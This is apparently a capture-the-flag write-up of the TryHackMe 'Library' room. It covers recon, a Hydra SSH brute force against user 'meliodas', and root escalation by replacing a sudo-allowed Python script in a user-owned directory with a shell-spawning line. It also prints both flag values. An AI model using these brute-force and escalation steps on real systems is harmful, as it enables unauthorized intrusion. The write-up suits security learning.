# TryHackMe — Library

> **Difficulty:** Easy
> **OS:** Linux (Ubuntu 16.04)
> **Tags:** SSH brute-force, sudo misconfiguration, wildcard in sudoers, file ownership vs directory ownership

---

## Summary

A boot2root machine featuring SSH password brute-force against a known user, followed by a Linux privilege escalation via a **classic sudo misconfiguration**: NOPASSWD execution of a root-owned Python script that lives in a user-writable directory. The attacker can simply replace the script's content (since they own the parent directory) and execute arbitrary code as root.

---

## Attack Path

```
┌──────────────────┐     ┌──────────────────┐     ┌────────────────────┐
│  Recon (nmap +   │ ──▶ │ Hint in robots   │ ──▶ │ Hydra SSH brute on │
│  gobuster + HTML │     │ "User-agent:     │     │ user "meliodas"    │
│  enumeration)    │     │  rockyou"        │     │ → password found   │
└──────────────────┘     └──────────────────┘     └────────────────────┘
                                                            │
                                                            ▼
┌──────────────────┐     ┌──────────────────┐     ┌────────────────────┐
│ ROOT shell       │ ◀── │ Replace bak.py   │ ◀── │ sudo -l reveals    │
│ /root/root.txt   │     │ (own dir, can    │     │ NOPASSWD on        │
│                  │     │ delete + recreate│     │ python* bak.py     │
└──────────────────┘     └──────────────────┘     └────────────────────┘
```

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oN nmap.txt 10.145.129.146
```

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
| http-robots.txt: 1 disallowed entry
|_/
```

Two services: SSH and HTTP. The Apache + OpenSSH versions correspond to Ubuntu 16.04 (Xenial). Notably, `robots.txt` has one disallowed entry — worth checking.

### Web enumeration

```bash
gobuster dir -u http://10.145.129.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
/index.html       (Status: 200)
/images           (Status: 301)
/robots.txt       (Status: 200)
/server-status    (Status: 403)
```

The site is fully static — only HTML files, no `.php`, no backend. The "comment form" on `index.html` has `action="#"` and goes nowhere, so it's a dead end.

### The `robots.txt` hint

```bash
curl http://10.145.129.146/robots.txt
```

```
User-agent: rockyou
Disallow: /
```

This is a deliberate hint from the room author: brute-force with the `rockyou.txt` wordlist. The HTML also reveals a candidate username — the blog post is signed by **`meliodas`**.

---

## Initial Access

### SSH brute-force

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.145.129.146 -t 4 -V -f -W 3
```

> **⚠️ Lessons learned — Hydra false positive**
>
> The first run of Hydra (without `-W` delay) reported `iloveyou` as the password, but it failed both interactively and via `sshpass`. This is a known quirk of Hydra against OpenSSH under load: when threads send near-simultaneous attempts with similar passwords, the server's response can be misattributed.
>
> **Re-running with `-W 3`** (3-second delay between attempts) returned the real password: **`iloveyou1`**.
>
> **Takeaway:** Always verify Hydra's output with a real login attempt before pivoting. For SSH brute-force, prefer `-t 4 -W 3` over higher thread counts — speed gains are not worth false positives.

```bash
ssh meliodas@10.145.129.146
# password: iloveyou1
```

User flag:

```bash
cat ~/user.txt
# 6d488cbb3f111d135722c33cb635f4ec
```

---

## Privilege Escalation

### Initial enumeration

```bash
meliodas@ubuntu:~$ ls -la
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
```

Two anomalies stand out:

1. **`bak.py` is owned by root** but lives in `/home/meliodas/` (a user-owned directory).
2. **`.sudo_as_admin_successful`** — Ubuntu auto-creates this on first successful `sudo` invocation by a member of the `sudo` group. So `meliodas` has sudo rights.

### Reading the script

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

The script archives `/var/www/html` into `/var/backups/website.zip`. The script content itself contains no exploitable bug — no `eval`, no command injection, no insecure deserialization. The vulnerability is in **how it's executed**, not in the code.

### The sudo misconfiguration

```bash
meliodas@ubuntu:~$ sudo -l
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

This rule looks restrictive — only `bak.py` can be run, only via Python, with no password. But there's a critical oversight:

**File ownership ≠ file integrity.**

In Linux, the right to **delete and recreate** a file is governed by write permissions on the **containing directory**, not on the file itself. Looking at the home directory:

```
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
```

`meliodas` owns `/home/meliodas/` and has `w` on it. That means `meliodas` can **delete** the root-owned `bak.py` and create a new file with the same name. The new file will be owned by `meliodas`, but `sudo` will execute it without complaint — sudo only checks the *path*, not the *owner*.

### Exploitation

```bash
rm /home/meliodas/bak.py
echo 'import os; os.system("/bin/bash")' > /home/meliodas/bak.py
sudo /usr/bin/python /home/meliodas/bak.py
```

Result:

```bash
root@ubuntu:~# whoami
root
root@ubuntu:~# cat /root/root.txt
e8c8c6c256c35515d1d344ee0488c617
```

---

## Notes on the wildcard `python*`

The sudoers entry uses `/usr/bin/python*`, which matches any binary whose name starts with `python` in `/usr/bin/`:

- `/usr/bin/python`
- `/usr/bin/python2`, `/usr/bin/python2.7`
- `/usr/bin/python3`, `/usr/bin/python3.5`

A common assumption is that this wildcard could be abused by placing a custom `python` binary somewhere in `$PATH`. **But this is blocked by `secure_path`** in the sudoers `Defaults`:

```
secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

`secure_path` overrides the user's `$PATH` for sudo invocations, so the only way to exploit this configuration is via the script-replacement vector above.

---

## Key Takeaways

1. **Verify brute-force results.** Hydra can produce false positives on SSH under contention. Always confirm a hit with `sshpass` or interactive login before moving on. Use `-W 3` and modest `-t` values for SSH targets.

2. **`robots.txt` is rarely a security control on CTFs — it's a hint.** When the entry literally references a wordlist, take the invitation.

3. **Sudo on a script in a writable directory = root.** This is a recurring pattern in real-world misconfigurations. The lesson generalizes: any time a privileged action references a path inside a directory the unprivileged user controls, the file's own ownership is irrelevant. Always check the **directory's** permissions, not just the file's.

4. **Read the script, but don't get fixated on the code.** The script's logic was a red herring. The exploitable bug was at the OS-permissions layer, not in the Python.

5. **`.sudo_as_admin_successful` is a fast indicator.** Its presence in a user's home directory immediately tells you the account is in the `sudo` group, even before running `sudo -l`.

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `6d488cbb3f111d135722c33cb635f4ec` |
| root.txt | `e8c8c6c256c35515d1d344ee0488c617` |
